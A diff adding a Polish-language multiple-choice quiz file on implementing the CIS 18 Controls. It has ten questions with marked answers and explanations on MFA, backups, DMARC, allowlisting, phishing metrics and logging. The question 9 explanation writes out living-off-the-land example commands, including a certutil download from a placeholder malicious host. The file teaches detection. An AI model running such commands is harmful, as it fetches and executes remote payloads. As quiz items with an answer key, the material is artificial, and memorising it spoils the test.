@@ -1,0 +1,126 @@
+{
+  "module": 11,
+  "title": "CIS 18 Controls — szczegółowe wdrożenie",
+  "questions": [
+    {
+      "id": 1,
+      "question": "Firma 25-osobowa pyta od czego zacząć z CIS Controls. Jakie trzy safeguardy przyniosą największy ROI bezpieczeństwa?",
+      "options": [
+        "18.2 Penetration Testing, 16.4 SAST/DAST, 13.3 NIDS",
+        "6.3 MFA dla zewnętrznych aplikacji, 11.5 Test backupu kwartalnie, 7.3 Skanowanie podatności",
+        "1.1 Inwentarz aktywów, 2.1 Inwentarz oprogramowania, 3.2 Klasyfikacja danych",
+        "17.3 Plan IR, 14.9 Symulacje phishingowe, 8.13 SIEM"
+      ],
+      "correct": 1,
+      "explanation": "Trzy safeguardy o najwyższym ROI dla MŚP: (1) 6.3 MFA — blokuje 99.9% ataków credential; (2) 11.5 Test backupu — upewnia że odtworzenie po ransomware jest możliwe; (3) 7.3 Skanowanie podatności — wykrywa znane luki zanim zrobi to atakujący. Razem adresują trzy najczęstsze przyczyny incydentów: skradzione hasła, ransomware bez możliwości odtworzenia, exploitacja znanych podatności."
+    },
+    {
+      "id": 2,
+      "question": "Czym jest Application Allowlisting (CIS Control 2.5) i dlaczego jest tak skuteczne?",
+      "options": [
+        "Lista dozwolonych stron internetowych w firmowym proxy",
+        "Tylko zatwierdzonych aplikacje mogą się uruchomić na urządzeniu — zero-day malware i nieautoryzowane narzędzia nie uruchomią się nawet jeśli zostaną pobrane",
+        "Lista aplikacji które mają dostęp do internetu",
+        "Automatyczne aktualizacje dla zatwierdzonych aplikacji"
+      ],
+      "correct": 1,
+      "explanation": "Application Allowlisting (whitelist) to jeden z najskuteczniejszych mechanizmów — NSA i ASD (Australian Signals Directorate) klasyfikują ją jako Top 4 mitigation. Logika: zamiast blokować znane złe (blacklisting, które zawodzi na zero-day), zezwalasz tylko na znane dobre. Nowe malware, niezatwierdzone narzędzia atakującego, złośliwe skrypty — nie uruchomią się bo nie ma ich na liście. Windows: WDAC lub AppLocker. Wyzwanie: utrzymanie whitelist w środowiskach z wieloma aplikacjami."
+    },
+    {
+      "id": 3,
+      "question": "Reguła 3-2-1-1-0 dla backupu. Co oznacza ostatnie '0'?",
+      "options": [
+        "Zero kosztów dla backupu podstawowego",
+        "Zero błędów weryfikacji przy ostatnim teście odtwarzania — backup który nie jest przetestowany, nie istnieje jako skuteczna kontrola",
+        "Zero dni opóźnienia między backupem a replikacją",
+        "Zero dostępu dla użytkowników do zasobów backup"
+      ],
+      "correct": 1,
+      "explanation": "3-2-1-1-0: 3 kopie, 2 różne media, 1 offsite, 1 offline (air-gapped), 0 błędów w ostatnim teście. Ostatnie '0' to najważniejsza cyfra: backup który nie był testowany NIE jest backupem — jest nadzieją. Organizacje regularnie odkrywają podczas incydentu ransomware że backupy są uszkodzone, zaszyfrowane, niekompletne lub proces odtwarzania trwa 10x dłużej niż planowano. CIS Control 11.5: testuj odtwarzanie kwartalnie i dokumentuj wyniki."
+    },
+    {
+      "id": 4,
+      "question": "DMARC policy = 'reject'. Co to oznacza i jakie e-maile blokuje?",
+      "options": [
+        "Odrzuca wszystkie e-maile z zewnątrz domeny",
+        "Serwery pocztowe odbiorców odrzucają e-maile podszywające się pod Twoją domenę gdy SPF lub DKIM nie przejdzie — ochrona przed spoofingiem domeny firmy",
+        "Odrzuca e-maile bez certyfikatu TLS",
+        "Odrzuca e-maile z załącznikami powyżej 10 MB"
+      ],
+      "correct": 1,
+      "explanation": "DMARC z policy=reject: gdy ktoś wyśle e-mail podszywając się pod @twojafirma.pl (From: ceo@twojafirma.pl) z niezautoryzowanego serwera → SPF fail (serwer nie na liście) lub DKIM fail (brak podpisu) → DMARC instruuje serwer odbiorcy: 'odrzuć ten e-mail'. Chroni ofiary phishingu przez Twoją domenę. Policy progression: none (monitoring) → quarantine (spam) → reject (blokada). CIS 9.5 rekomenduje dojście do 'reject' jako cel."
+    },
+    {
+      "id": 5,
+      "question": "Firma wdraża CIS Controls IG1. Safeguard 5.3 mówi 'wyłącz nieaktywne konta po 45 dniach'. Pracownik był na urlopie 60 dni i wrócił — jego konto zostało wyłączone. Czy to właściwe zachowanie?",
+      "options": [
+        "Nie — bezpieczeństwo nie może zakłócać operacji biznesowych, próg powinien być 180 dni",
+        "Tak — to właściwe zachowanie. Reaktywacja wymaga weryfikacji przez HR/managera, co jest akceptowalnym procesem dla powracającego pracownika i eliminuje ryzyko kont 'zombie'",
+        "Nie — urlop powinien być automatycznie wykluczony ze zliczania nieaktywności",
+        "Tak, ale tylko dla kont administracyjnych"
+      ],
+      "correct": 1,
+      "explanation": "Wyłączenie konta to właściwe zachowanie — safeguard 5.3 celowo nie robi wyjątków dla urlopów, bo konta 'zombie' (długo nieaktywne) są częstym wektorem ataków. Reaktywacja przez HR/managera to akceptowalny friction który zapewnia że konto jest świadomie przywracane aktywnej osobie. W praktyce: dobry system IAM integruje się z HR i 'wie' o urlopie, automatycznie resetując licznik. Ale zasada jest właściwa — 45 dni nieaktywności = ryzyko."
+    },
+    {
+      "id": 6,
+      "question": "CIS Control 16 dotyczy Application Software Security. Czym różni się SAST od DAST?",
+      "options": [
+        "SAST jest droższy, DAST tańszy",
+        "SAST (Static) analizuje kod źródłowy bez uruchamiania — znajduje podatności w kodzie; DAST (Dynamic) testuje działającą aplikację z zewnątrz — symuluje atakującego",
+        "SAST jest dla backendu, DAST dla frontendu",
+        "DAST wymaga dostępu do kodu źródłowego, SAST nie"
+      ],
+      "correct": 1,
+      "explanation": "SAST: 'białe pudełko' — analizuje kod bez uruchamiania (może być zintegrowany w CI/CD pipeline). Znajdzie SQL injection w kodzie, hardcoded credentials, niebezpieczne funkcje. Narzędzia: SonarQube, Semgrep, Checkmarx. DAST: 'czarne pudełko' — testuje działającą aplikację jak atakujący (bez dostępu do kodu). Znajdzie XSS, injection, problemy autoryzacji w runtime. Narzędzia: OWASP ZAP, Burp Suite. Najlepiej używać obu — SAST w CI/CD, DAST w staging."
+    },
+    {
+      "id": 7,
+      "question": "Symulacja phishingowa pokazała click rate 35% (35% pracowników kliknęło w fałszywy link). Co to oznacza i jaki jest cel?",
+      "options": [
+        "35% to dobry wynik — większość pracowników (65%) nie kliknęła",
+        "35% to zły wynik wymagający działania. Cel CIS Controls: <5% po regularnych szkoleniach i symulacjach. 35% oznacza że co trzeci pracownik jest podatny na phishing",
+        "Wynik jest bez znaczenia — symulacje phishingowe nie przewidują rzeczywistych ataków",
+        "35% to wynik bazowy — poprawy można oczekiwać tylko przez zatrudnienie nowych pracowników"
+      ],
+      "correct": 1,
+      "explanation": "35% click rate to zły wynik — co trzeci pracownik jest podatny na phishing, co jest głównym wektorem initial access dla większości ataków. Cel po regularnych szkoleniach: <5%, najlepsi osiągają <2%. Proces: baseline test (poznaj obecny poziom) → szkolenie → kolejna symulacja → mierzenie trendu. Ważne: pracownicy którzy klikają powinni dostać natychmiastowe szkolenie remediation (teachable moment), nie karę. Raportuj click rate zarządowi jako KPI programu bezpieczeństwa."
+    },
+    {
+      "id": 8,
+      "question": "Kontrola 15 (Service Provider Management) wymaga oceny dostawców. Jakie dowody bezpieczeństwa warto wymagać od dostawcy SaaS przechowującego dane klientów?",
+      "options": [
+        "Deklaracja zarządu dostawcy że 'dbają o bezpieczeństwo'",
+        "SOC 2 Type II Report lub ISO 27001 certyfikat (nie starszy niż 1 rok) + odpowiedzi na security questionnaire + DPA (Data Processing Agreement) zgodny z RODO",
+        "Wystarczy że dostawca ma SSL na stronie",
+        "Pentesty przeprowadzone przez klienta w środowisku dostawcy"
+      ],
+      "correct": 1,
+      "explanation": "Ocena dostawcy SaaS z dostępem do danych: (1) SOC 2 Type II lub ISO 27001 — niezależnie zweryfikowane kontrole bezpieczeństwa; (2) Security questionnaire (SIG, CAIQ) — szczegółowe pytania o architekturę bezpieczeństwa; (3) DPA — umowa przetwarzania danych wymagana przez RODO art. 28; (4) Prawo do audytu w kontrakcie. Certyfikaty nie starsze niż 1 rok. Dla krytycznych dostawców: coroczna weryfikacja. CIS 15.5 rekomenduje risk-based approach — im krytyczniejszy dostawca, tym głębsza ocena."
+    },
+    {
+      "id": 9,
+      "question": "Safeguard 8.9 wymaga Process Audit Logging (logowania komend uruchamianych przez procesy). Dlaczego to kluczowe dla detekcji?",
+      "options": [
+        "Umożliwia monitorowanie wydajności aplikacji",
+        "Pozwala wykryć złośliwe komendy PowerShell, shell i inne (living off the land) — gdy atakujący używa wbudowanych narzędzi systemu, jedyną 'sygnaturą' jest sama komenda. Bez process logging — niewidoczne",
+        "Wymagane przez RODO dla systemów przetwarzających dane osobowe",
+        "Umożliwia billing za zasoby obliczeniowe"
+      ],
+      "correct": 1,
+      "explanation": "Process audit logging (Sysmon Event ID 1 na Windows, auditd na Linux) jest kluczowy dla detekcji 'living off the land' attacks. Gdy atakujący uruchamia `powershell.exe -EncodedCommand <base64>` lub `certutil.exe -urlcache -split -f http://malicious.site/payload` — te komendy pojawiają się w process logs. Bez tego logowania — brak dowodów, brak detekcji. ATT&CK dla T1059 (Command and Scripting Interpreter) wskazuje Process Audit Logs jako primary data source dla detekcji."
+    },
+    {
+      "id": 10,
+      "question": "Firma wdrożyła CIS Controls IG1 w Q1 i IG2 w Q3. Jakim metryką najlepiej zmierzyć postęp?",
+      "options": [
+        "Liczba incydentów bezpieczeństwa (cel: zero)",
+        "Kombinacja: % safeguards wdrożonych z IG1/IG2, % urządzeń z MFA, click rate phishing, % podatności Critical/High naprawionych w SLA, czas do wykrycia incydentu (MTTD)",
+        "Budżet wydany na bezpieczeństwo jako % przychodów",
+        "Liczba polityk bezpieczeństwa udokumentowanych"
+      ],
+      "correct": 1,
+      "explanation": "Metryki CIS Controls powinny mierzyć stan implementacji I skuteczność: (1) % safeguards wdrożonych (tracking postępu); (2) % urządzeń z MFA (coverage); (3) Phishing click rate (trend szkoleniowy); (4) % Critical/High CVE naprawionych w SLA (dyscyplina patch management); (5) MTTD — Mean Time to Detect (jak szybko wykrywamy incydenty). Cel: trend poprawy w czasie, nie perfekcja od razu. Raportuj te metryki zarządowi kwartalnie — dają objektywny obraz postępu programu bezpieczeństwa."
+    }
+  ]
+}
